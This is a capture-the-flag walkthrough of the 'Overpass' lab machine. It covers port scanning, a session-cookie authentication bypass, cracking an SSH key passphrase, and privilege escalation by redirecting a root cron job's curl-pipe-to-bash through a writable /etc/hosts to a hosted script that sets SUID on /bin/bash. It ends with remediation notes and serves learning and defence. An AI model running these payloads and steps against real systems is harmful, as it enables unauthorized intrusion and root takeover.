# Overpass

**Target:** 10.130.162.198 (changes each time you start the environment) \
**Objective:** Obtain flags in user.txt and root.txt

## 1. Recon

An initial full port scan revealed only 2 ports were open

```sh
nmap -sC -sV -p- 10.130.162.198
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Golang net/http server
```

Without the valid SSH credentials, the web service on port 80 was the only entry point. SSH was the way in but only once the web app yielded a usable key and passphrase


## 2. Web Enumeration

Gobuster revealed other endpoint

```sh
gobuster dir -u http://10.130.162.198/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Key findings:

- `/admin` - admin login page (new endpoint)
- `/downloads` - links to precompiled binaries and source code
- `/about` - staff info and names


The client side login logic (`login.js`) showed that authentication was handled entirely server side via a POST to `/api/login`. A successful login set a `SessionToken` cookie and redirected to `/admin`. 


## 3. SQL Injection

Manual payloads and an automated `sqlmap` run against the `username` field of `/api/login` were attempted.

```sh
sqlmap -u "http://10.130.162.198/api/login" --data="username=admin&password=admin" -p username --batch --level=5 --risk=3
```

sqlmap initially flagged a time based blind injection but this was confirmed as a false positive on further testing. SQL injection was not the intended path.


## 4. Broken authentication on /admin

Testing the `/admin` endpoint with an arbitrary, invalid `SessionToken` cookie value revealed that the page did not properly validate the token, it simply checked for its presence.
 
  
```sh
curl -s -i -L -b "SessionToken=asdf" http://10.130.162.198/admin/
```
 
The response rendered the full admin page, which contained a note from a colleague ("Paradox") to the user James, along with an encrypted RSA private key embedded directly in the HTML.
 
## 5. Cracking the SSH Key
 
The key was saved locally and its passphrase cracked offline using John the Ripper against rockyou.txt.
 
```sh
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
 
Result: passphrase `james13`.

## 6. Initial Foothold
 
```
ssh -i id_rsa james@10.130.162.198
```
 
Passphrase `james13` unlocked the key, granting a shell as `james`. The user flag was retrieved from `/home/james/user.txt`.
 
## 7. Privilege Escalation
 
### 7.1 Enumeration
 
`/etc/crontab` showed a root cron job running every minute:
 
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
 
`/etc/hosts` resolved `overpass.thm` to `127.0.0.1`, so this job normally hit the local Go web server and piped whatever it returned straight into a root shell.
 
A file writability check found the actual weakness:
 
```
find / -writable -type f 2>/dev/null
```
 
`/etc/hosts` was writable by james, despite being owned by root.
 
### 7.2 Exploitation
 
An attacking machine was set up to serve a malicious `buildscript.sh` at the exact path root's cron requests.
 
```
mkdir -p ~/malicious/downloads/src
cat > ~/malicious/downloads/src/buildscript.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
cd ~/malicious
python3 -m http.server 80
```
 
`/etc/hosts` on the target was then edited to redirect `overpass.thm` to the attacking machine's VPN IP:
 
```
192.168.128.39 overpass.thm
```
 
Within a minute, root's cron job fetched and executed the malicious script, setting the SUID bit on `/bin/bash`.
 
### 7.3 Root Shell
 
```
bash -p
```
 
This preserved the SUID privilege, giving an effective root shell. The root flag was retrieved from `/root/root.txt`.
 
 ## 8. Summary of the Attack Chain
 
1. Broken session validation on `/admin` leaked an encrypted RSA private key.
2. Weak passphrase on that key (`james13`, found via rockyou) enabled SSH access as james.
3. Decoding james's local rot47 encoded password vault yielded further credentials, though ultimately not required for privesc.
4. A world writable `/etc/hosts` file allowed redirection of a domain a root cron job trusted implicitly.
5. Hosting a malicious payload at that domain resulted in root code execution via the cron job.
## 9. Remediation Notes
 
- Validate session tokens server side rather than merely checking for the cookie's presence.
- Never embed private keys or secrets in HTML served to unauthenticated users.
- Enforce strong passphrases on private keys.
- Restrict write permissions on `/etc/hosts` to root only.
- Avoid piping remote content directly into a shell (`curl | bash`) in any privileged, automated job, and verify the source over HTTPS with pinned certificates or checksums.